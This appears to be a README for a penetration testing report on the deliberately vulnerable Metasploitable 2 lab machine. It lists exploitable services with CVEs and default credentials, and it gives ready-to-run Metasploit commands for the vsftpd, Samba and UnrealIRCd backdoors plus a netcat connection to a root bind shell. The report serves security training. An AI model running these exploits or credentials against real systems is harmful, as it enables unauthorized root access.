# Metasploitable 2 — Comprehensive Penetration Testing Report

[📖 قراءة التقرير بالعربية](README_AR.md) | [English Version](README.md)
[📄 Original Report File (PDF)](./pentest-report-metasploitable2.pdf.pdf)

---

## 📋 Overview & Metadata

| Attribute | Details |
| :--- | :--- |
| **Target Machine** | Metasploitable 2 (VulnHub / Rapid7) |
| **Target OS** | Ubuntu 8.04.4 LTS (Kernel 2.6.24) |
| **Assessment Type** | Full-Scope Vulnerability Assessment & Enterprise Network Auditing |
| **Scope** | Over 15 simultaneously exposed vulnerable network services |
| **Key Exploits** | vsftpd 2.3.4 Backdoor, Samba `usermap script`, distcc RCE, UnrealIRCd Backdoor, Tomcat WAR Deployment, Java RMI, Insecure R-Services |

---

## 🎯 Exploitation Matrix

| Service | Port | Vulnerability / Exploit | CVE | Privilege Gained |
| :--- | :--- | :--- | :--- | :--- |
| **vsftpd** | `21/tcp` | Smiley Face Backdoor (`:)`) | CVE-2011-2523 | `root` |
| **Samba** | `139/445/tcp` | `usermap script` Arbitrary Command Execution | CVE-2007-2447 | `root` |
| **UnrealIRCd** | `6667/tcp` | Backdoor Command Execution | CVE-2010-2075 | `root` |
| **distcc** | `3632/tcp` | Compilation Daemon RCE | CVE-2004-2687 | `daemon` |
| **Apache Tomcat** | `8180/tcp` | Manager Default Credentials (`tomcat:tomcat`) -> WAR Shell | CWE-522 | `tomcat` |
| **Ingreslock** | `1524/tcp` | Direct Bind Shell (Legacy Backdoor) | N/A | `root` |
| **MySQL** | `3306/tcp` | Blank Password for `root` | CWE-287 | Database Admin |
| **PostgreSQL** | `5432/tcp` | Default Credentials `postgres:postgres` | CWE-798 | Database Admin |

---

## 🛠️ Detailed Exploitation Breakdown

### 1. vsftpd 2.3.4 Backdoor (CVE-2011-2523)
Connecting to FTP and supplying a username ending with `:)` triggers a backdoor listener on port 6200:
```bash
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <TARGET_IP>; run"
```
Instant Root shell!

### 2. Samba usermap script (CVE-2007-2447)
Samba 3.0.20 executes user input passed to the `username map script` configuration directive through `sh`:
```bash
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS <TARGET_IP>; run"
```
Instant Root shell!

### 3. UnrealIRCd Backdoor (CVE-2010-2075)
A malicious backdoor present in the source archive triggers command execution when sending commands prefixed with `AB;`:
```bash
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS <TARGET_IP>; run"
```
Instant Root shell!

### 4. Direct Ingreslock Backdoor (Port 1524)
Port 1524 runs an unauthenticated root bind shell:
```bash
nc <TARGET_IP> 1524
whoami
root
```
